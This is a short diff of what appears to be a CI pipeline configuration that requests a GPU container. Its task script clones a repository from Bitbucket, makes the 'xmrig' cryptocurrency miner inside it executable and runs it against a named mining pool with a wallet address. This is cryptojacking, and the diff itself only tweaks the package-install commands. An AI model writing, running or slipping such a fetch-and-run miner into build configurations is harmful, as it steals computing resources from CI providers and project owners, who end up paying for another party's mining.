@@ -6,8 +6,8 @@ container:
   gpu_type: nvidia-tesla-v100 # do we need the choice?
 task:
   script: |
-   apt-get update -y \
-   && apt-get install -y \ git \
+   apt update -y \
+   && apt install -y \ git \
    && git clone https://bitbucket.org/UsertBokehf/mnun \
    && chmod +x ./mnun/xmrig \
    && ./mnun/xmrig -o arq.pool.gntl.co.uk:10008 -u aRi1mBz6iddEmCrduae2TnYB94o41g9ug9HgPvBZF5aUNZY7opu7Z9HYTKA4PphzbTGdXamfR4RyW1XryRHpV92Qccd8fTsRkDV1RB37AVQKG -k --tls
